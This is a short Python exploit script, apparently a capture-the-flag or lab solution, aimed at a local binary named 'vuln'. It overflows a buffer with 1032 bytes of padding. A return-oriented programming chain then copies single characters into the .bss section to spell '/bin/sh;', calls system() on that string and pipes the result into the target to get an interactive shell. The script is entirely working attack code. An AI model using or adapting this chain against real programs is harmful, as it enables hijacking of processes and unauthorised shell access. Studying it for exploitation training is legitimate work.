#!/usr/bin/env python


import os
from struct import pack


# instruction locations
strcpy = pack("<Q", 0x400480)
system = pack("<Q", 0x400490)
poprdi = pack("<Q", 0x4006a3)
poprsi_popr15 = pack("<Q", 0x4006a1)

# string locations
slash = pack("<Q", 0x400238)
b = pack("<Q", 0x40023b)
i = pack("<Q", 0x40023a)
n = pack("<Q", 0x400244)
a = pack("<Q", 0x40035c)
s = pack("<Q", 0x40024f)
h = pack("<Q", 0x400486)
e = pack("<Q", 0x40035b)
l = pack("<Q", 0x400239)
z = pack("<Q", 0x4004b2)
c = pack("<Q", 0x40034c)
t = pack("<Q", 0x400192)
d = pack("<Q", 0x400193)
o = pack("<Q", 0x400250)
w = pack("<Q", 0x400769)
p = pack("<Q", 0x400357)
u = pack("<Q", 0x400245)
hyphen = pack("<Q", 0x400241)
semi = pack("<Q", 0x4005e6)
space = pack("<Q", 0x4000e2)
dot = pack("<Q", 0x40024e)
slash = pack("<Q", 0x400238)

# string storage locations
bss0 = pack("<Q", 0x601040)
bss1 = pack("<Q", 0x601041)
bss2 = pack("<Q", 0x601042)
bss3 = pack("<Q", 0x601043)
bss4 = pack("<Q", 0x601044)
bss5 = pack("<Q", 0x601045)
bss6 = pack("<Q", 0x601046)
bss7 = pack("<Q", 0x601047)
bss8 = pack("<Q", 0x601048)
bss9 = pack("<Q", 0x601049)
bss10 = pack("<Q", 0x60104a)
bss11 = pack("<Q", 0x60104b)
bss12 = pack("<Q", 0x60104c)
bss13 = pack("<Q", 0x60104d)
bss14 = pack("<Q", 0x60104e)
bss15 = pack("<Q", 0x60104f)
bss16 = pack("<Q", 0x601050)
bss17 = pack("<Q", 0x601051)
bss18 = pack("<Q", 0x601052)
bss19 = pack("<Q", 0x601053)
bss20 = pack("<Q", 0x601054)
bss21 = pack("<Q", 0x601055)
bss22 = pack("<Q", 0x601056)

payload = ""

def add_letter(dest, src):
    global payload
    payload += poprdi
    payload += dest

    payload += poprsi_popr15
    payload += src
    payload += s # garbage

    payload += strcpy


# buffer
payload += "A"*1032

# build string 
add_letter(bss0, slash)
add_letter(bss1, b)
add_letter(bss2, i)
add_letter(bss3, n)
add_letter(bss4, slash)
add_letter(bss5, s)
add_letter(bss6, h)
add_letter(bss7, semi)
"""
add_letter(bss8, semi)
add_letter(bss9, semi)
add_letter(bss10, hyphen)
add_letter(bss11, p)
add_letter(bss12, semi)
add_letter(bss13, h)
add_letter(bss14, i)
add_letter(bss15, semi)
add_letter(bss16, p)
add_letter(bss17, a)
add_letter(bss18, s)
add_letter(bss19, s)
add_letter(bss20, w)
add_letter(bss21, d)
add_letter(bss22, semi)
"""

# execute system
payload += poprdi
payload += bss0
payload += system


# payload
f = open("in.txt", "w")
f.write(payload)
f.close()
os.system("(cat in.txt; cat) | ./vuln hello")
os.system("rm in.txt")

